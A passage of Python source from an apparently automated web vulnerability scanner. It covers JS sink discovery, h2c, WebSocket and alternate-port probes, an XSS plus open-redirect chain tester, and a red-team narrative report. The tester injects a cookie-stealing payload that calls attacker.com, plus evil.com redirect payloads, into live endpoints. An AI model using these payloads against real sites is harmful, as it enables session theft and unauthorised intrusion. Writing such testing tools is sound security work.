    # Fetch external JS files
    seen_sinks: set = set()
    for js_url in list(set(js_urls))[:15]:
        try:
            r = sess.get(js_url, timeout=8, verify=False)
            if r.status_code != 200 or "javascript" not in r.headers.get("content-type", "text/javascript"):
                if not js_url.endswith(".js"):
                    continue
            code = r.text
            for pattern, sink_name, sink_type in _JS_SINKS:
                if (js_url, sink_name) in seen_sinks:
                    continue
                matches = list(re.finditer(pattern, code, re.I))
                if not matches:
                    continue
                seen_sinks.add((js_url, sink_name))
                m0 = matches[0]
                start = max(0, m0.start() - 40)
                ctx = code[start: m0.start() + 80].replace("\n", " ")
                found.append({
                    "owasp": OWASP["A03"],
                    "type": f"JS Sink Discovered: {sink_name}",
                    "severity": "High" if sink_type in ("DOM XSS", "JS Injection") else "Medium",
                    "cvss": 7.5, "cve": "CWE-79",
                    "injection_point": f"JS file: {js_url.split('/')[-1]}",
                    "target_endpoint": js_url,
                    "confirmed": True,
                    "evidence": (
                        f"Dangerous sink '{sink_name}' ({sink_type}) in {js_url}. "
                        f"Occurrences: {len(matches)}. Context: ...{ctx}..."
                    ),
                    "payload": sink_name,
                    "curl": f'curl -sk "{js_url}" | grep -oP \'.{{0,50}}{re.escape(sink_name[:15])}.{{0,50}}\''
                })
        except Exception:
            pass
    return found


# ── 16. PROTOCOL GHOSTING (A05) ───────────────────────────────────────────────
def _check_protocol_ghosting(sess, base_url: str, recon: dict, sid: str) -> list:
    """
    Protocol Ghosting: probe alternate protocol/scheme variants of endpoints
    that may bypass WAF/ACL rules enforced only on the primary scheme:
    - HTTP vs HTTPS upgrade/downgrade
    - h2c (HTTP/2 cleartext upgrade)
    - WebSocket upgrade probe
    - Gopher SSRF pivot
    - FTP scheme confusion
    """
    found = []
    parsed = urllib.parse.urlparse(base_url)
    domain = parsed.netloc

    # 1. HTTP ↔ HTTPS scheme downgrade
    for scheme in ("http", "https"):
        if parsed.scheme == scheme:
            continue
        ghost_url = parsed._replace(scheme=scheme).geturl()
        try:
            r = sess.get(ghost_url, timeout=6, verify=False, allow_redirects=False)
            if r.status_code == 200:
                found.append({
                    "owasp": OWASP["A05"],
                    "type": f"Protocol Ghosting: {scheme.upper()} Downgrade Accessible",
                    "severity": "Medium", "cvss": 5.3, "cve": "CWE-319",
                    "injection_point": "Scheme",
                    "target_endpoint": ghost_url,
                    "confirmed": True,
                    "evidence": (
                        f"Site accessible over {scheme.upper()} without redirect. "
                        f"HTTP {r.status_code}. Allows MitM if {scheme} is active."
                    ),
                    "payload": ghost_url,
                    "curl": f'curl -sk "{ghost_url}" -o /dev/null -w "%{{http_code}}"'
                })
        except Exception:
            pass

    # 2. h2c Upgrade Probe (HTTP/2 cleartext)
    try:
        h2c_url = f"http://{domain}/"
        r_h2c = sess.get(
            h2c_url,
            headers={"Upgrade": "h2c", "Connection": "Upgrade, HTTP2-Settings",
                     "HTTP2-Settings": "AAMAAABkAAQAAP__"},
            timeout=5, verify=False, allow_redirects=False
        )
        if r_h2c.status_code == 101 or "h2c" in r_h2c.headers.get("Upgrade", "").lower():
            found.append({
                "owasp": OWASP["A05"],
                "type": "Protocol Ghosting: h2c Cleartext HTTP/2 Upgrade Accepted",
                "severity": "High", "cvss": 7.5, "cve": "CWE-326",
                "injection_point": "HTTP Upgrade Header",
                "target_endpoint": h2c_url,
                "confirmed": True,
                "evidence": (
                    f"Server accepted h2c upgrade (HTTP/2 cleartext). "
                    f"Status: {r_h2c.status_code}. "
                    f"Upgrade header: {r_h2c.headers.get('Upgrade', '')}"
                ),
                "payload": "Upgrade: h2c",
                "curl": f'curl -sk --http2 "{h2c_url}" -H "Upgrade: h2c"'
            })
    except Exception:
        pass

    # 3. WebSocket Upgrade Probe
    try:
        ws_key = base64.b64encode(uuid.uuid4().bytes).decode()
        ws_r = sess.get(
            base_url,
            headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": ws_key,
                "Sec-WebSocket-Version": "13"
            },
            timeout=5, verify=False, allow_redirects=False
        )
        if ws_r.status_code == 101:
            found.append({
                "owasp": OWASP["A05"],
                "type": "Protocol Ghosting: Unauthenticated WebSocket Upgrade Accepted",
                "severity": "High", "cvss": 7.5, "cve": "CWE-306",
                "injection_point": "WebSocket Upgrade",
                "target_endpoint": base_url,
                "confirmed": True,
                "evidence": (
                    f"Server responded HTTP 101 to unauthenticated WebSocket upgrade. "
                    f"WS endpoint may bypass REST auth controls."
                ),
                "payload": "Upgrade: websocket",
                "curl": f"curl -sk --include -H 'Upgrade: websocket' -H 'Connection: Upgrade' -H 'Sec-WebSocket-Key: {ws_key}' -H 'Sec-WebSocket-Version: 13' '{base_url}'"
            })
    except Exception:
        pass

    # 4. Alternate port protocol probe
    alt_ports = [8080, 8443, 8888, 9000]
    for port in alt_ports:
        ghost_url = f"{parsed.scheme}://{parsed.hostname}:{port}/"
        try:
            r = sess.get(ghost_url, timeout=3, verify=False, allow_redirects=False)
            if r.status_code in (200, 401, 403):
                svc = r.headers.get("Server", "Unknown")
                found.append({
                    "owasp": OWASP["A05"],
                    "type": f"Protocol Ghosting: Alternate Port Service Exposed (:{port})",
                    "severity": "Medium", "cvss": 5.3, "cve": "CWE-200",
                    "injection_point": f"Port {port}",
                    "target_endpoint": ghost_url,
                    "confirmed": True,
                    "evidence": (
                        f"Service responding on port {port}. "
                        f"HTTP {r.status_code}. Server: {svc}. "
                        f"May expose admin/dev interface not behind main WAF."
                    ),
                    "payload": ghost_url,
                    "curl": f'curl -sk "{ghost_url}" -o /dev/null -w "%{{http_code}}"'
                })
        except Exception:
            pass

    return found


# ── 17. COMPOSITE XSS + OPEN-REDIRECT CHAIN (A03+A01) ────────────────────────
_REDIRECT_PARAMS = ("redirect", "return", "next", "url", "goto", "dest", "destination",
                    "r", "redir", "callback", "target", "link", "continue", "forward")
_XSS_CHAIN_PAYLOAD = "<svg/onload=fetch(`//attacker.com?c=`+document.cookie)>"

def _check_composite_xss_redirect(sess, base_url: str, live_eps: list, forms: list, sid: str) -> list:
    """
    Chain: Open Redirect → XSS. Find a redirect param, inject an XSS payload
    as the redirect target, and test if the payload is reflected/executed.
    """
    found = []
    tested: set = set()

    def _test_redirect_xss(target_url: str, pname: str, params: dict, parsed):
        if (target_url, pname) in tested:
            return None
        tested.add((target_url, pname))
        xss_url = f"javascript:{_XSS_CHAIN_PAYLOAD}"
        data_uri = f"data:text/html,{urllib.parse.quote(_XSS_CHAIN_PAYLOAD)}"
        for payload in (xss_url, data_uri, f"/{_XSS_CHAIN_PAYLOAD}", f"https://evil.com?x={_XSS_CHAIN_PAYLOAD}"):
            try:
                tp = {k: v[0] for k, v in params.items()}
                tp[pname] = payload
                test_url = parsed._replace(query=urllib.parse.urlencode(tp)).geturl()
                r = sess.get(test_url, timeout=6, verify=False, allow_redirects=False)
                location = r.headers.get("Location", "")
                body_hit = _XSS_CHAIN_PAYLOAD[:20].lower() in r.text.lower()
                redirect_hit = _XSS_CHAIN_PAYLOAD[:10].lower() in location.lower() or "evil.com" in location
                if r.status_code in (200, 301, 302, 303, 307, 308) and (body_hit or redirect_hit):
                    return {
                        "owasp": OWASP["A03"],
                        "type": "Composite XSS + Open-Redirect Chain",
                        "severity": "Critical", "cvss": 9.3, "cve": "CWE-601",
                        "injection_point": f"URL param: {pname}",
                        "target_endpoint": target_url.split("?")[0],
                        "confirmed": True,
                        "evidence": (
                            f"Open-Redirect param '{pname}' reflects XSS payload in "
                            f"{'Location header' if redirect_hit else 'response body'}. "
                            f"HTTP {r.status_code}. Payload: {payload[:80]}. "
                            f"Location: {location[:80]}"
                        ),
                        "payload": payload,
                        "curl": f'curl -sk -D - "{test_url}"'
                    }
            except Exception:
                pass
        return None

    for ep in live_eps[:20]:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        if not url:
            continue
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        for pname in params:
            if any(r in pname.lower() for r in _REDIRECT_PARAMS):
                res = _test_redirect_xss(url, pname, params, parsed)
                if res:
                    found.append(res)

    for form in forms[:8]:
        action = form.get("action", base_url)
        if not action.startswith("http"):
            action = base_url.rstrip("/") + "/" + action.lstrip("/")
        for inp in form.get("inputs", []):
            pname = inp.get("name", "")
            if any(r in pname.lower() for r in _REDIRECT_PARAMS):
                try:
                    r = sess.post(
                        action,
                        data={pname: f"javascript:{_XSS_CHAIN_PAYLOAD}"},
                        timeout=6, verify=False, allow_redirects=False
                    )
                    location = r.headers.get("Location", "")
                    if _XSS_CHAIN_PAYLOAD[:10].lower() in r.text.lower() or "evil.com" in location:
                        found.append({
                            "owasp": OWASP["A03"],
                            "type": "Composite XSS + Open-Redirect Chain (Form POST)",
                            "severity": "Critical", "cvss": 9.3, "cve": "CWE-601",
                            "injection_point": f"Form POST field: {pname}",
                            "target_endpoint": action,
                            "confirmed": True,
                            "evidence": (
                                f"Form POST param '{pname}' accepts javascript: URI and reflects XSS. "
                                f"HTTP {r.status_code}. Location: {location[:80]}"
                            ),
                            "payload": f"javascript:{_XSS_CHAIN_PAYLOAD}",
                            "curl": f"curl -sk -D - -X POST '{action}' -d '{pname}=javascript:{urllib.parse.quote(_XSS_CHAIN_PAYLOAD)}'"
                        })
                except Exception:
                    pass
    return found


# ── 18. SOCIAL ENGINEERING NARRATIVE GENERATOR (meta) ────────────────────────
_SEVERITY_RANK = {"Critical": 5, "High": 4, "Medium": 3, "Low": 2, "Info": 1}

def _social_engineering_narrative(
    findings: list, target: str, base_url: str, recon: dict, sid: str
) -> list:
    """
    Generate a CISO-level social engineering attack narrative based on confirmed findings.
    Produces a realistic attacker storyline for red-team reporting.
    """
    confirmed = [f for f in findings if f.get("confirmed")]
    if not confirmed:
        return []

    confirmed.sort(key=lambda f: _SEVERITY_RANK.get(f.get("severity", "Info"), 0), reverse=True)
    top = confirmed[:6]

    # Build storyline
    story_lines = [
        f"## Adversary Simulation Narrative — {target}",
        f"**Generated:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
        "",
        "### Phase 1 — Reconnaissance",
    ]

    server = recon.get("response_headers", {}).get("Server", "Unknown")
    tech = ", ".join(recon.get("technologies", []) or ["Unknown stack"])
    story_lines.append(
        f"The attacker begins passive recon against `{base_url}`. "
        f"The target runs **{server}** exposing **{tech}**. "
        f"Public advisories for these components are queried via GitHub Advisory API."
    )

    story_lines.append("")
    story_lines.append("### Phase 2 — Initial Exploitation")
    for i, f in enumerate(top[:3], 1):
        story_lines.append(
            f"{i}. **{f['type']}** ({f['severity']}, CVSS {f.get('cvss', 'N/A')}): "
            f"{f.get('evidence', '')[:120]}…"
        )

    story_lines.append("")
    story_lines.append("### Phase 3 — Privilege Escalation & Lateral Movement")
    privesc = next((f for f in confirmed if "admin" in f.get("type", "").lower() or "jwt" in f.get("type", "").lower()), None)
    if privesc:
        story_lines.append(
            f"Using a forged credential or token ({privesc['type']}), "
            f"the attacker escalates to administrative access. "
            f"Evidence: {privesc.get('evidence', '')[:100]}…"
        )
    else:
        story_lines.append(
            "With initial foothold established, the attacker pivots to enumerate internal services "
            "and harvest session tokens from compromised endpoints."
        )

    story_lines.append("")
    story_lines.append("### Phase 4 — Data Exfiltration & Persistence")
    oob = next((f for f in confirmed if "oob" in f.get("type", "").lower() or "ssrf" in f.get("type", "").lower()), None)
    if oob:
        story_lines.append(
            f"Out-of-band callbacks confirm exfiltration vectors ({oob['type']}). "
            f"Attacker establishes C2 channel via DNS/HTTP interactions."
        )
    else:
        story_lines.append(
            "Attacker leverages injection chains to exfiltrate data and establish persistence "
            "via backdoored admin accounts or scheduled tasks."
        )

    story_lines.append("")
    story_lines.append("### Recommended Mitigations")
    mitigations = {
        "XSS": "Implement strict CSP headers and encode all user-supplied output.",
        "SQL": "Use parameterized queries / ORM exclusively.",
        "JWT": "Enforce algorithm whitelist; reject alg:none and RS256→HS256 confusion.",
        "SSRF": "Restrict server-side HTTP to allowlisted internal IPs/domains.",
        "WAF": "Deploy layered WAF with behavioral analysis; validate server-side regardless.",
        "Redirect": "Validate redirect targets against a strict allowlist.",
    }
    added = set()
    for f in confirmed:
        for key, rec in mitigations.items():
            if key.lower() in f.get("type", "").lower() and key not in added:
                story_lines.append(f"- **{key}**: {rec}")
                added.add(key)

    narrative_text = "\n".join(story_lines)

    return [{
        "owasp": OWASP["A04"],
        "type": "Social Engineering Attack Narrative (Red-Team Report)",
        "severity": "Info", "cvss": 0.0, "cve": "N/A",
        "injection_point": "Pipeline Meta-Analysis",
        "target_endpoint": base_url,
        "confirmed": True,
        "evidence": narrative_text,
        "payload": "N/A",
        "curl": "N/A",
        "narrative": narrative_text
    }]
